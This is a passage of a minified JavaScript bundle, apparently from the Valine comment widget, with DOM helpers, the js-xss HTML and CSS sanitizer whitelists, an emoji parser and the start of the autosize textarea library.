if("%AsyncIteratorPrototype%"===e){var r=n("%AsyncGenerator%");r&&b&&(t=b(r.prototype))}return x[e]=t,t}(a)),void 0===r&&!e)throw new l("intrinsic "+n+" exists, but is not available. Please file an issue!");return{alias:t,name:a,value:r}}throw new s("intrinsic "+n+" does not exist!")};n.exports=function(n,e){if("string"!=typeof n||0===n.length)throw new l("intrinsic name must be a non-empty string");if(arguments.length>1&&"boolean"!=typeof e)throw new l('"allowMissing" argument must be a boolean');if(null===E(/^%?[^%]*%?$/,n))throw new s("`%` may not be present anywhere but at the beginning and end of the intrinsic name");var t=I(n),a=t.length>0?t[0]:"",r=z("%"+a+"%",e),o=r.name,i=r.value,c=!1,p=r.alias;p&&(a=p[0],j(t,T([0,1],p)));for(var d=1,m=!0;d<t.length;d+=1){var h=t[d],g=A(h,0,1),f=A(h,-1);if(('"'===g||"'"===g||"`"===g||'"'===f||"'"===f||"`"===f)&&g!==f)throw new s("property names with quotes must have matching quotes");if("constructor"!==h&&m||(c=!0),C(x,o="%"+(a+="."+h)+"%"))i=x[o];else if(null!=i){if(!(h in i)){if(!e)throw new l("base intrinsic for "+n+" exists, but the property is not available.");return}if(u&&d+1>=t.length){var b=u(i,h);i=(m=!!b)&&"get"in b&&!("originalValue"in b.get)?b.get:i[h]}else m=C(i,h),i=i[h];m&&!c&&(x[o]=i)}}return i}},function(n,e,t){"use strict";function a(n){return n&&n.__esModule?n:{default:n}}function r(n){var e=null==n?String(n):{}.toString.call(n)||"object";return"[object Object]"==e&&(e="object"),"[object Function]"==e&&(e="function"),e}function o(n){return null!=n&&n==n.window}function i(n){return"object"==r(n)}e.__esModule=!0;var s="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},l=a(t(54)),c=a(t(37)),p=a(t(34)),d=a(t(36)),u=a(t(33)),m=document,h=navigator,g=/[&<>"'`\\]/g,f=RegExp(g.source),b=/&(?:amp|lt|gt|quot|#39|#x60|#x5c);/g,v=RegExp(b.source),y={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;","`":"&#x60;","\\":"&#x5c;"},x={};for(var w in y)x[y[w]]=w;var k=null;Array.prototype.forEach||(Array.prototype.forEach=function(n,e){var t,a;if(null==this)throw new TypeError(" this is null or not defined");var r=Object(this),o=r.length>>>0;if("function"!=typeof n)throw new TypeError(n+" is not a function");for(arguments.length>1&&(t=e),a=0;a<o;){var i;a in r&&(i=r[a],n.call(t,i,a,r)),a++}}),window.NodeList&&!NodeList.prototype.forEach&&(NodeList.prototype.forEach=Array.prototype.forEach),String.prototype.trim||(String.prototype.trim=function(){return this.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,"")}),(0,l.default)(c.default.fn,{prepend:function(n){return n instanceof HTMLElement||(n=n[0]),this.forEach((function(e){e.insertAdjacentElement("afterBegin",n)})),this},append:function(n){return n instanceof HTMLElement||(n=n[0]),this.forEach((function(e){e.insertAdjacentElement("beforeEnd",n)})),this},remove:function(){return this.forEach((function(n){try{n.parentNode.removeChild(n)}catch(n){}})),this},find:function(n){return(0,c.default)(n,this)},show:function(){return this.forEach((function(n){n.style.display="block"})),this},hide:function(){return this.forEach((function(n){n.style.display="none"})),this},on:function(n,e,t){return c.default.fn.off(n,e,t),this.forEach((function(a){n.split(" ").forEach((function(n){a.addEventListener?a.addEventListener(n,e,t||!1):a.attachEvent?a.attachEvent("on"+n,e):a["on"+n]=e}))})),this},off:function(n,e,t){return this.forEach((function(a){n.split(" ").forEach((function(n){a.removeEventListener?a.removeEventListener(n,e,t||!1):a.detachEvent?a.detachEvent("on"+n,e):a["on"+n]=null}))})),this},html:function(n){return void 0!==n?(this.forEach((function(e){e.innerHTML=n})),this):this[0].innerHTML},text:function(n){return void 0!==n?(this.forEach((function(e){e.innerText=n})),this):this[0].innerText},empty:function(n){return n=n||0,this.forEach((function(e){setTimeout((function(n){e.innerText=""}),n)})),this},val:function(n){return void 0!==n?(this.forEach((function(e){e.value=n})),this):this[0].value||""},attr:function(){var n=arguments;if("object"==s(arguments[0])){var e=arguments[0],t=this;return Object.keys(e).forEach((function(n){t.forEach((function(t){t.setAttribute(n,e[n])}))})),this}return"string"==typeof arguments[0]&&arguments.length<2?this[0].getAttribute(arguments[0])||"":(this.forEach((function(e){e.setAttribute(n[0],n[1])})),this)},removeAttr:function(n){return this.forEach((function(e){var t,a=0,r=n&&n.match(/[^\x20\t\r\n\f\*\/\\]+/g);if(r&&1===e.nodeType)for(;t=r[a++];)e.removeAttribute(t)})),this},hasClass:function(n){return!!this[0]&&new RegExp("(\\s|^)"+n+"(\\s|$)").test(this[0].getAttribute("class"))},addClass:function(n){return this.forEach((function(e){var t=(0,c.default)(e),a=t.attr("class");t.hasClass(n)||t.attr("class",a+=" "+n)})),this},removeClass:function(n){return this.forEach((function(e){var t=(0,c.default)(e),a=t.attr("class");if(t.hasClass(n)){var r=new RegExp("(\\s|^)"+n+"(\\s|$)");t.attr("class",a.replace(r,""))}})),this}}),(0,l.default)(c.default,{isFunction:function(n){return"function"==r(n)},isWindow:o,isDocument:function(n){return null!=n&&n.nodeType==n.DOCUMENT_NODE},isObject:i,isPlainObject:function(n){return i(n)&&!o(n)&&Object.getPrototypeOf(n)==Object.prototype},extend:l.default,noop:function(){},navi:h,ua:h.userAgent,lang:h.language||h.languages[0],detect:p.default,store:d.default,escape:function(n){return n&&f.test(n)?n.replace(g,(function(n){return y[n]})):n},unescape:function(n){return n&&v.test(n)?n.replace(b,(function(n){return x[n]})):n},dynamicLoadSource:function(n,e){if((0,c.default)('script[src="'+n+'"]').length)e&&e();else{var t=m.createElement("script");t.onload=t.onreadystatechange=function(){this.onload=this.onreadystatechange=null,e&&e(),(0,c.default)(t).remove()},t.async=!0,t.setAttribute("referrerPolicy","no-referrer"),(0,c.default)("head")[0].appendChild(t),t.src=n}},sdkLoader:function(n,e,t){e in window&&window[e]?(k&&clearTimeout(k),t&&t()):c.default.dynamicLoadSource(n,(function(){k=setTimeout(c.default.sdkLoader(n,e,t),100)}))},deleteInWin:function(n,e){var t=function(e){if(n in window)try{delete window[n]}catch(e){window[n]=null}};0===e?t():setTimeout(t,e||500)},ajax:u.default}),e.default=c.default},function(n,e,t){"use strict";e.__esModule=!0,e.DEFAULT_EMOJI_CDN="//img.t.sinajs.cn/t4/appstyle/expression/ext/normal/",e.DB_NAME="Comment",e.CONFIG={lang:"zh-CN",langMode:null,appId:"",appKey:"",clazzName:"Comment",meta:["nick","mail","link"],path:location.pathname,placeholder:"Just Go Go",pageSize:10,recordIP:!0,serverURLs:"",visitor:!1,mathJax:!1,emojiCDN:"",emojiMaps:void 0,enableQQ:!1,requiredFields:[]},e.defaultMeta=["nick","mail","link"],e.QQCacheKey="_v_Cache_Q",e.MetaCacheKey="_v_Cache_Meta",e.RandomStr=function(n){return(Date.now()+Math.round(1e3*Math.random())).toString(32)},e.VERSION="1.5.2"},function(n,e,t){var a=t(11),r=t(39);for(var o in(e=n.exports=function(n,e){return new r(e).process(n)}).FilterCSS=r,a)e[o]=a[o];"undefined"!=typeof window&&(window.filterCSS=n.exports)},function(n,e,t){"use strict";var a=t(1)("%Object.defineProperty%",!0)||!1;if(a)try{a({},"a",{value:1})}catch(n){a=!1}n.exports=a},function(n,e,t){"use strict";var a=t(47);n.exports=Function.prototype.bind||a},function(n,e){n.exports={indexOf:function(n,e){var t,a;if(Array.prototype.indexOf)return n.indexOf(e);for(t=0,a=n.length;t<a;t++)if(n[t]===e)return t;return-1},forEach:function(n,e,t){var a,r;if(Array.prototype.forEach)return n.forEach(e,t);for(a=0,r=n.length;a<r;a++)e.call(t,n[a],a,n)},trim:function(n){return String.prototype.trim?n.trim():n.replace(/(^\s*)|(\s*$)/g,"")},spaceIndex:function(n){var e=/\s|\n|\t/.exec(n);return e?e.index:-1}}},function(n,e,t){"use strict";e.__esModule=!0;var a={cdn:t(3).DEFAULT_EMOJI_CDN,maps:t(64),parse:function(n,e){return String(n).replace(new RegExp(":("+Object.keys(a.maps).join("|")+"):","ig"),(function(n,t){return a.maps[t]?a.build(t,e):n}))},build:function(n,e){var t=/^(https?:)?\/\//i,r=a.maps[n],o=t.test(r)?r:a.cdn+r,i=' <img alt="'+n+'" referrerpolicy="no-referrer" class="vemoji" src="'+o+'" />';return t.test(o)?i:""}};e.default=a},function(n,e,t){"use strict";e.__esModule=!0;var a=function(n){return n&&n.__esModule?n:{default:n}}(t(62));e.default=function(n){return(0,a.default)(n,{onTagAttr:function(n,e,t,a){return r(n,e,t,a)},onIgnoreTagAttr:function(n,e,t,a){return r(n,e,t,a)}}).replace(/\<\/?div\>/gi,"")};var r=function(n,e,t,r){if(/video|audio/i.test(n))return"";if(/code|pre|span/i.test(n)){if("style"==e){var o=t.match(/color:([#a-z0-9]{3,7}|\s+[#a-z0-9]{3,8})/gi);return o&&o.length?'style="'+o[0]+'"':""}if("class"==e)return e+"='"+a.default.escapeAttrValue(t)+"'"}return"a"===n&&"class"==e&&"at"===t?e+"='"+a.default.escapeAttrValue(t)+"'":"img"===n&&/src|class/i.test(e)?e+"='"+a.default.escapeAttrValue(t)+"' referrerPolicy='no-referrer'":void 0}},function(n,e,t){"use strict";var a=t(6),r=t(1),o=t(60),i=t(0),s=r("%Function.prototype.apply%"),l=r("%Function.prototype.call%"),c=r("%Reflect.apply%",!0)||a.call(l,s),p=t(5),d=r("%Math.max%");n.exports=function(n){if("function"!=typeof n)throw new i("a function is required");var e=c(a,l,arguments);return o(e,1+d(0,n.length-(arguments.length-1)),!0)};var u=function(){return c(a,s,arguments)};p?p(n.exports,"apply",{value:u}):n.exports.apply=u},function(n,e){function t(){var n={"align-content":!1,"align-items":!1,"align-self":!1,"alignment-adjust":!1,"alignment-baseline":!1,all:!1,"anchor-point":!1,animation:!1,"animation-delay":!1,"animation-direction":!1,"animation-duration":!1,"animation-fill-mode":!1,"animation-iteration-count":!1,"animation-name":!1,"animation-play-state":!1,"animation-timing-function":!1,azimuth:!1,"backface-visibility":!1,background:!0,"background-attachment":!0,"background-clip":!0,"background-color":!0,"background-image":!0,"background-origin":!0,"background-position":!0,"background-repeat":!0,"background-size":!0,"baseline-shift":!1,binding:!1,bleed:!1,"bookmark-label":!1,"bookmark-level":!1,"bookmark-state":!1,border:!0,"border-bottom":!0,"border-bottom-color":!0,"border-bottom-left-radius":!0,"border-bottom-right-radius":!0,"border-bottom-style":!0,"border-bottom-width":!0,"border-collapse":!0,"border-color":!0,"border-image":!0,"border-image-outset":!0,"border-image-repeat":!0,"border-image-slice":!0,"border-image-source":!0,"border-image-width":!0,"border-left":!0,"border-left-color":!0,"border-left-style":!0,"border-left-width":!0,"border-radius":!0,"border-right":!0,"border-right-color":!0,"border-right-style":!0,"border-right-width":!0,"border-spacing":!0,"border-style":!0,"border-top":!0,"border-top-color":!0,"border-top-left-radius":!0,"border-top-right-radius":!0,"border-top-style":!0,"border-top-width":!0,"border-width":!0,bottom:!1,"box-decoration-break":!0,"box-shadow":!0,"box-sizing":!0,"box-snap":!0,"box-suppress":!0,"break-after":!0,"break-before":!0,"break-inside":!0,"caption-side":!1,chains:!1,clear:!0,clip:!1,"clip-path":!1,"clip-rule":!1,color:!0,"color-interpolation-filters":!0,"column-count":!1,"column-fill":!1,"column-gap":!1,"column-rule":!1,"column-rule-color":!1,"column-rule-style":!1,"column-rule-width":!1,"column-span":!1,"column-width":!1,columns:!1,contain:!1,content:!1,"counter-increment":!1,"counter-reset":!1,"counter-set":!1,crop:!1,cue:!1,"cue-after":!1,"cue-before":!1,cursor:!1,direction:!1,display:!0,"display-inside":!0,"display-list":!0,"display-outside":!0,"dominant-baseline":!1,elevation:!1,"empty-cells":!1,filter:!1,flex:!1,"flex-basis":!1,"flex-direction":!1,"flex-flow":!1,"flex-grow":!1,"flex-shrink":!1,"flex-wrap":!1,float:!1,"float-offset":!1,"flood-color":!1,"flood-opacity":!1,"flow-from":!1,"flow-into":!1,font:!0,"font-family":!0,"font-feature-settings":!0,"font-kerning":!0,"font-language-override":!0,"font-size":!0,"font-size-adjust":!0,"font-stretch":!0,"font-style":!0,"font-synthesis":!0,"font-variant":!0,"font-variant-alternates":!0,"font-variant-caps":!0,"font-variant-east-asian":!0,"font-variant-ligatures":!0,"font-variant-numeric":!0,"font-variant-position":!0,"font-weight":!0,grid:!1,"grid-area":!1,"grid-auto-columns":!1,"grid-auto-flow":!1,"grid-auto-rows":!1,"grid-column":!1,"grid-column-end":!1,"grid-column-start":!1,"grid-row":!1,"grid-row-end":!1,"grid-row-start":!1,"grid-template":!1,"grid-template-areas":!1,"grid-template-columns":!1,"grid-template-rows":!1,"hanging-punctuation":!1,height:!0,hyphens:!1,icon:!1,"image-orientation":!1,"image-resolution":!1,"ime-mode":!1,"initial-letters":!1,"inline-box-align":!1,"justify-content":!1,"justify-items":!1,"justify-self":!1,left:!1,"letter-spacing":!0,"lighting-color":!0,"line-box-contain":!1,"line-break":!1,"line-grid":!1,"line-height":!1,"line-snap":!1,"line-stacking":!1,"line-stacking-ruby":!1,"line-stacking-shift":!1,"line-stacking-strategy":!1,"list-style":!0,"list-style-image":!0,"list-style-position":!0,"list-style-type":!0,margin:!0,"margin-bottom":!0,"margin-left":!0,"margin-right":!0,"margin-top":!0,"marker-offset":!1,"marker-side":!1,marks:!1,mask:!1,"mask-box":!1,"mask-box-outset":!1,"mask-box-repeat":!1,"mask-box-slice":!1,"mask-box-source":!1,"mask-box-width":!1,"mask-clip":!1,"mask-image":!1,"mask-origin":!1,"mask-position":!1,"mask-repeat":!1,"mask-size":!1,"mask-source-type":!1,"mask-type":!1,"max-height":!0,"max-lines":!1,"max-width":!0,"min-height":!0,"min-width":!0,"move-to":!1,"nav-down":!1,"nav-index":!1,"nav-left":!1,"nav-right":!1,"nav-up":!1,"object-fit":!1,"object-position":!1,opacity:!1,order:!1,orphans:!1,outline:!1,"outline-color":!1,"outline-offset":!1,"outline-style":!1,"outline-width":!1,overflow:!1,"overflow-wrap":!1,"overflow-x":!1,"overflow-y":!1,padding:!0,"padding-bottom":!0,"padding-left":!0,"padding-right":!0,"padding-top":!0,page:!1,"page-break-after":!1,"page-break-before":!1,"page-break-inside":!1,"page-policy":!1,pause:!1,"pause-after":!1,"pause-before":!1,perspective:!1,"perspective-origin":!1,pitch:!1,"pitch-range":!1,"play-during":!1,position:!1,"presentation-level":!1,quotes:!1,"region-fragment":!1,resize:!1,rest:!1,"rest-after":!1,"rest-before":!1,richness:!1,right:!1,rotation:!1,"rotation-point":!1,"ruby-align":!1,"ruby-merge":!1,"ruby-position":!1,"shape-image-threshold":!1,"shape-outside":!1,"shape-margin":!1,size:!1,speak:!1,"speak-as":!1,"speak-header":!1,"speak-numeral":!1,"speak-punctuation":!1,"speech-rate":!1,stress:!1,"string-set":!1,"tab-size":!1,"table-layout":!1,"text-align":!0,"text-align-last":!0,"text-combine-upright":!0,"text-decoration":!0,"text-decoration-color":!0,"text-decoration-line":!0,"text-decoration-skip":!0,"text-decoration-style":!0,"text-emphasis":!0,"text-emphasis-color":!0,"text-emphasis-position":!0,"text-emphasis-style":!0,"text-height":!0,"text-indent":!0,"text-justify":!0,"text-orientation":!0,"text-overflow":!0,"text-shadow":!0,"text-space-collapse":!0,"text-transform":!0,"text-underline-position":!0,"text-wrap":!0,top:!1,transform:!1,"transform-origin":!1,"transform-style":!1,transition:!1,"transition-delay":!1,"transition-duration":!1,"transition-property":!1,"transition-timing-function":!1,"unicode-bidi":!1,"vertical-align":!1,visibility:!1,"voice-balance":!1,"voice-duration":!1,"voice-family":!1,"voice-pitch":!1,"voice-range":!1,"voice-rate":!1,"voice-stress":!1,"voice-volume":!1,volume:!1,"white-space":!1,widows:!1,width:!0,"will-change":!1,"word-break":!0,"word-spacing":!0,"word-wrap":!0,"wrap-flow":!1,"wrap-through":!1,"writing-mode":!1,"z-index":!1};return n}var a=/javascript\s*\:/gim;e.whiteList=t(),e.getDefaultWhiteList=t,e.onAttr=function(n,e,t){},e.onIgnoreAttr=function(n,e,t){},e.safeAttrValue=function(n,e){return a.test(e)?"":e}},function(n,e){n.exports={indexOf:function(n,e){var t,a;if(Array.prototype.indexOf)return n.indexOf(e);for(t=0,a=n.length;t<a;t++)if(n[t]===e)return t;return-1},forEach:function(n,e,t){var a,r;if(Array.prototype.forEach)return n.forEach(e,t);for(a=0,r=n.length;a<r;a++)e.call(t,n[a],a,n)},trim:function(n){return String.prototype.trim?n.trim():n.replace(/(^\s*)|(\s*$)/g,"")},trimRight:function(n){return String.prototype.trimRight?n.trimRight():n.replace(/(\s*$)/g,"")}}},function(n,e,t){"use strict";var a=t(5),r=t(15),o=t(0),i=t(16);n.exports=function(n,e,t){if(!n||"object"!=typeof n&&"function"!=typeof n)throw new o("`obj` must be an object or a function`");if("string"!=typeof e&&"symbol"!=typeof e)throw new o("`property` must be a string or a symbol`");if(arguments.length>3&&"boolean"!=typeof arguments[3]&&null!==arguments[3])throw new o("`nonEnumerable`, if provided, must be a boolean or null");if(arguments.length>4&&"boolean"!=typeof arguments[4]&&null!==arguments[4])throw new o("`nonWritable`, if provided, must be a boolean or null");if(arguments.length>5&&"boolean"!=typeof arguments[5]&&null!==arguments[5])throw new o("`nonConfigurable`, if provided, must be a boolean or null");if(arguments.length>6&&"boolean"!=typeof arguments[6])throw new o("`loose`, if provided, must be a boolean");var s=arguments.length>3?arguments[3]:null,l=arguments.length>4?arguments[4]:null,c=arguments.length>5?arguments[5]:null,p=arguments.length>6&&arguments[6],d=!!i&&i(n,e);if(a)a(n,e,{configurable:null===c&&d?d.configurable:!c,enumerable:null===s&&d?d.enumerable:!s,value:t,writable:null===l&&d?d.writable:!l});else{if(!p&&(s||l||c))throw new r("This environment does not support defining a property as non-configurable, non-writable, or non-enumerable.");n[e]=t}}},function(n,e,t){"use strict";var a=t(56),r="function"==typeof Symbol&&"symbol"==typeof Symbol("foo"),o=Object.prototype.toString,i=Array.prototype.concat,s=t(13),l=t(17)(),c=function(n,e,t,a){if(e in n)if(!0===a){if(n[e]===t)return}else if(!function(n){return"function"==typeof n&&"[object Function]"===o.call(n)}(a)||!a())return;l?s(n,e,t,!0):s(n,e,t)},p=function(n,e){var t=arguments.length>2?arguments[2]:{},o=a(e);r&&(o=i.call(o,Object.getOwnPropertySymbols(e)));for(var s=0;s<o.length;s+=1)c(n,o[s],e[o[s]],t[o[s]])};p.supportsDescriptors=!!l,n.exports=p},function(n,e,t){"use strict";n.exports=SyntaxError},function(n,e,t){"use strict";var a=t(1)("%Object.getOwnPropertyDescriptor%",!0);if(a)try{a([],"length")}catch(n){a=null}n.exports=a},function(n,e,t){"use strict";var a=t(5),r=function(){return!!a};r.hasArrayLengthDefineBug=function(){if(!a)return null;try{return 1!==a([],"length",{value:1}).length}catch(n){return!0}},n.exports=r},function(n,e,t){"use strict";var a=Function.prototype.call,r=Object.prototype.hasOwnProperty,o=t(6);n.exports=o.call(a,r)},function(n,e,t){"use strict";var a=Object.prototype.toString;n.exports=function(n){var e=a.call(n),t="[object Arguments]"===e;return t||(t="[object Array]"!==e&&null!==n&&"object"==typeof n&&"number"==typeof n.length&&n.length>=0&&"[object Function]"===a.call(n.callee)),t}},function(n,e,t){"use strict";var a=t(46),r=t(38),o=r("Object.prototype.propertyIsEnumerable"),i=r("Array.prototype.push");n.exports=function(n){var e=a(n),t=[];for(var r in e)o(e,r)&&i(t,[r,e[r]]);return t}},function(n,e,t){"use strict";var a=t(20);n.exports=function(){return"function"==typeof Object.entries?Object.entries:a}},function(n,e,t){function a(){return{a:["target","href","title"],abbr:["title"],address:[],area:["shape","coords","href","alt"],article:[],aside:[],audio:["autoplay","controls","crossorigin","loop","muted","preload","src"],b:[],bdi:["dir"],bdo:["dir"],big:[],blockquote:["cite"],br:[],caption:[],center:[],cite:[],code:[],col:["align","valign","span","width"],colgroup:["align","valign","span","width"],dd:[],del:["datetime"],details:["open"],div:[],dl:[],dt:[],em:[],figcaption:[],figure:[],font:["color","size","face"],footer:[],h1:[],h2:[],h3:[],h4:[],h5:[],h6:[],header:[],hr:[],i:[],img:["src","alt","title","width","height","loading"],ins:["datetime"],kbd:[],li:[],mark:[],nav:[],ol:[],p:[],pre:[],s:[],section:[],small:[],span:[],sub:[],summary:[],sup:[],strong:[],strike:[],table:["width","border","align","valign"],tbody:["align","valign"],td:["width","rowspan","colspan","align","valign"],tfoot:["align","valign"],th:["width","rowspan","colspan","align","valign"],thead:["align","valign"],tr:["rowspan","align","valign"],tt:[],u:[],ul:[],video:["autoplay","controls","crossorigin","loop","muted","playsinline","poster","preload","src","height","width"]}}function r(n){return n.replace(f,"&lt;").replace(b,"&gt;")}function o(n){return n.replace(v,"&quot;")}function i(n){return n.replace(y,'"')}function s(n){return n.replace(x,(function(n,e){return"x"===e[0]||"X"===e[0]?String.fromCharCode(parseInt(e.substr(1),16)):String.fromCharCode(parseInt(e,10))}))}function l(n){return n.replace(w,":").replace(k," ")}function c(n){for(var e="",t=0,a=n.length;t<a;t++)e+=n.charCodeAt(t)<32?" ":n.charAt(t);return h.trim(e)}function p(n){return c(n=l(n=s(n=i(n))))}function d(n){return r(n=o(n))}var u=t(4).FilterCSS,m=t(4).getDefaultWhiteList,h=t(7),g=new u,f=/</g,b=/>/g,v=/"/g,y=/&quot;/g,x=/&#([a-zA-Z0-9]*);?/gim,w=/&colon;?/gim,k=/&newline;?/gim,S=/((j\s*a\s*v\s*a|v\s*b|l\s*i\s*v\s*e)\s*s\s*c\s*r\s*i\s*p\s*t\s*|m\s*o\s*c\s*h\s*a):/gi,C=/e\s*x\s*p\s*r\s*e\s*s\s*s\s*i\s*o\s*n\s*\(.*/gi,T=/u\s*r\s*l\s*\(.*/gi;e.whiteList={a:["target","href","title"],abbr:["title"],address:[],area:["shape","coords","href","alt"],article:[],aside:[],audio:["autoplay","controls","crossorigin","loop","muted","preload","src"],b:[],bdi:["dir"],bdo:["dir"],big:[],blockquote:["cite"],br:[],caption:[],center:[],cite:[],code:[],col:["align","valign","span","width"],colgroup:["align","valign","span","width"],dd:[],del:["datetime"],details:["open"],div:[],dl:[],dt:[],em:[],figcaption:[],figure:[],font:["color","size","face"],footer:[],h1:[],h2:[],h3:[],h4:[],h5:[],h6:[],header:[],hr:[],i:[],img:["src","alt","title","width","height","loading"],ins:["datetime"],kbd:[],li:[],mark:[],nav:[],ol:[],p:[],pre:[],s:[],section:[],small:[],span:[],sub:[],summary:[],sup:[],strong:[],strike:[],table:["width","border","align","valign"],tbody:["align","valign"],td:["width","rowspan","colspan","align","valign"],tfoot:["align","valign"],th:["width","rowspan","colspan","align","valign"],thead:["align","valign"],tr:["rowspan","align","valign"],tt:[],u:[],ul:[],video:["autoplay","controls","crossorigin","loop","muted","playsinline","poster","preload","src","height","width"]},e.getDefaultWhiteList=a,e.onTag=function(n,e,t){},e.onIgnoreTag=function(n,e,t){},e.onTagAttr=function(n,e,t){},e.onIgnoreTagAttr=function(n,e,t){},e.safeAttrValue=function(n,e,t,a){if(t=p(t),"href"===e||"src"===e){if("#"===(t=h.trim(t)))return"#";if("http://"!==t.substr(0,7)&&"https://"!==t.substr(0,8)&&"mailto:"!==t.substr(0,7)&&"tel:"!==t.substr(0,4)&&"data:image/"!==t.substr(0,11)&&"ftp://"!==t.substr(0,6)&&"./"!==t.substr(0,2)&&"../"!==t.substr(0,3)&&"#"!==t[0]&&"/"!==t[0])return""}else if("background"===e){if(S.lastIndex=0,S.test(t))return""}else if("style"===e){if(C.lastIndex=0,C.test(t))return"";if(T.lastIndex=0,T.test(t)&&(S.lastIndex=0,S.test(t)))return"";!1!==a&&(t=(a=a||g).process(t))}return d(t)},e.escapeHtml=r,e.escapeQuote=o,e.unescapeQuote=i,e.escapeHtmlEntities=s,e.escapeDangerHtml5Entities=l,e.clearNonPrintableCharacter=c,e.friendlyAttrValue=p,e.escapeAttrValue=d,e.onIgnoreTagStripAll=function(){return""},e.StripTagBody=function(n,e){function t(e){return!!a||-1!==h.indexOf(n,e)}"function"!=typeof e&&(e=function(){});var a=!Array.isArray(n),r=[],o=!1;return{onIgnoreTag:function(n,a,i){if(t(n)){if(i.isClosing){var s="[/removed]",l=i.position+s.length;return r.push([!1!==o?o:i.position,l]),o=!1,s}return o||(o=i.position),"[removed]"}return e(n,a,i)},remove:function(n){var e="",t=0;return h.forEach(r,(function(a){e+=n.slice(t,a[0]),t=a[1]})),e+=n.slice(t)}}},e.stripCommentTag=function(n){for(var e="",t=0;t<n.length;){var a=n.indexOf("\x3c!--",t);if(-1===a){e+=n.slice(t);break}e+=n.slice(t,a);var r=n.indexOf("--\x3e",a);if(-1===r)break;t=r+3}return e},e.stripBlankChar=function(n){var e=n.split("");return(e=e.filter((function(n){var e=n.charCodeAt(0);return!(127===e||e<=31&&10!==e&&13!==e)}))).join("")},e.attributeWrapSign='"',e.cssFilter=g,e.getDefaultCSSWhiteList=m},function(n,e,t){function a(n){var e,t=c.spaceIndex(n);return e=-1===t?n.slice(1,-1):n.slice(1,t+1),"/"===(e=c.trim(e).toLowerCase()).slice(0,1)&&(e=e.slice(1)),"/"===e.slice(-1)&&(e=e.slice(0,-1)),e}function r(n){return"</"===n.slice(0,2)}function o(n,e){for(;e<n.length;e++){var t=n[e];if(" "!==t)return"="===t?e:-1}}function i(n,e){for(;e<n.length;e++){var t=n[e];if(" "!==t)return"'"===t||'"'===t?e:-1}}function s(n,e){for(;e>0;e--){var t=n[e];if(" "!==t)return"="===t?e:-1}}function l(n){return function(n){return'"'===n[0]&&'"'===n[n.length-1]||"'"===n[0]&&"'"===n[n.length-1]}(n)?n.substr(1,n.length-2):n}var c=t(7),p=/[^a-zA-Z0-9\\_:.-]/gim;e.parseTag=function(n,e,t){"use strict";var o="",i=0,s=!1,l=!1,c=0,p=n.length,d="",u="";n:for(c=0;c<p;c++){var m=n.charAt(c);if(!1===s){if("<"===m){s=c;continue}}else if(!1===l){if("<"===m){o+=t(n.slice(i,c)),s=c,i=c;continue}if(">"===m||c===p-1){o+=t(n.slice(i,s)),d=a(u=n.slice(s,c+1)),o+=e(s,o.length,d,u,r(u)),i=c+1,s=!1;continue}if('"'===m||"'"===m)for(var h=1,g=n.charAt(c-h);""===g.trim()||"="===g;){if("="===g){l=m;continue n}g=n.charAt(c-++h)}}else if(m===l){l=!1;continue}}return i<p&&(o+=t(n.substr(i))),o},e.parseAttr=function(n,e){"use strict";function t(n,t){if(!((n=(n=c.trim(n)).replace(p,"").toLowerCase()).length<1)){var a=e(n,t||"");a&&d.push(a)}}for(var a=0,r=0,d=[],u=!1,m=n.length,h=0;h<m;h++){var g,f=n.charAt(h);if(!1!==u||"="!==f)if(!1===u||h!==r){if(/\s|\n|\t/.test(f)){if(n=n.replace(/\s|\n|\t/g," "),!1===u){if(-1===(g=o(n,h))){t(c.trim(n.slice(a,h))),u=!1,a=h+1;continue}h=g-1;continue}if(-1===(g=s(n,h-1))){t(u,l(c.trim(n.slice(a,h)))),u=!1,a=h+1;continue}}}else{if(-1===(g=n.indexOf(f,h+1)))break;t(u,c.trim(n.slice(r+1,g))),u=!1,a=(h=g)+1}else u=n.slice(a,h),a=h+1,r='"'===n.charAt(a)||"'"===n.charAt(a)?a:i(n,h+1)}return a<n.length&&(!1===u?t(n.slice(a)):t(u,l(c.trim(n.slice(a))))),c.trim(d.join(" "))}},function(n,e,t){var a,r,o;
/*!
	autosize 4.0.4
	license: MIT
	http://www.jacklmoore.com/autosize
*/r=[n,e],a=function(n,e){"use strict";function t(n){function e(e){var t=n.style.width;n.style.width="0px",n.offsetWidth,n.style.width=t,n.style.overflowY=e}function t(){if(0!==n.scrollHeight){var e=function(n){for(var e=[];n&&n.parentNode&&n.parentNode instanceof Element;)n.parentNode.scrollTop&&e.push({node:n.parentNode,scrollTop:n.parentNode.scrollTop}),n=n.parentNode;return e}(n),t=document.documentElement&&document.documentElement.scrollTop;n.style.height="",n.style.height=n.scrollHeight+r+"px",s=n.clientWidth,e.forEach((function(n){n.node.scrollTop=n.scrollTop})),t&&(document.documentElement.scrollTop=t)}}function a(){t();var a=Math.round(parseFloat(n.style.height)),r=window.getComputedStyle(n,null),o="content-box"===r.boxSizing?Math.round(parseFloat(r.height)):n.offsetHeight;if(o<a?"hidden"===r.overflowY&&(e("scroll"),t(),o="content-box"===r.boxSizing?Math.round(parseFloat(window.getComputedStyle(n,null).height)):n.offsetHeight):"hidden"!==r.overflowY&&(e("hidden"),t(),o="content-box"===r.boxSizing?Math.round(parseFloat(window.getComputedStyle(n,null).height)):n.offsetHeight),l!==o){l=o;var s=i("autosize:resized");try{n.dispatchEvent(s)}catch(n){}}}if(n&&n.nodeName&&"TEXTAREA"===n.nodeName&&!o.has(n)){var r=null,s=null,l=null,c=function(){n.clientWidth!==s&&a()},p=function(e){window.removeEventListener("resize",c,!1),n.removeEventListener("input",a,!1),n.removeEventListener("keyup",a,!1),n.removeEventListener("autosize:destroy",p,!1),n.removeEventListener("autosize:update",a,!1),Object.keys(e).forEach((function(t){n.style[t]=e[t]})),o.delete(n)}.bind(n,{height:n.style.height,resize:n.style.resize,overflowY:n.style.overflowY,overflowX:n.style.overflowX,wordWrap:n.style.wordWrap});n.addEventListener("autosize:destroy",p,!1),"onpropertychange"in n&&"oninput"in n&&n.addEventListener("keyup",a,!1),window.addEventListener("resize",c,!1),n.addEventListener("input",a,!1),n.addEventListener("autosize:update",a,!1),n.style.overflowX="hidden",n.style.wordWrap="break-word",o.set(n,{destroy:p,update:a}),function(){var 